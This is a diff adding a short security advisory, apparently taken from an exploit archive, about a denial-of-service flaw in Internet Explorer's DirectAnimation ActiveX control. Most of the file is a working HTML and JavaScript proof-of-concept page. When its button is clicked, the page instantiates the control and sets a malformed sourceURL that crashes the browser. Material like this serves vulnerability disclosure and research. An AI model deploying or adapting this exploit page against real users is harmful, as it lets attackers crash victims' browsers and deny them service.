@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/18855/info
+
+Microsoft Internet Explorer is prone to a denial-of-service vulnerability because it fails to handle ActiveX controls properly.
+
+This issue is triggered when an attacker convinces a victim user to activate a malicious ActiveX control.
+
+Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.
+
+<html><body><script>
+
+// MoBB Demonstration
+function Demo() {
+        var a = new ActiveXObject(&#039;DirectAnimation.StructuredGraphicsControl&#039;);
+        a.sourceURL = &#039;CrashingBecauseStreamPtrNotInitialized&#039;;
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type=&#039;button&#039; onClick=&#039;Demo()&#039; value=&#039;Start Demo!&#039;>
+
+
+</body></html>
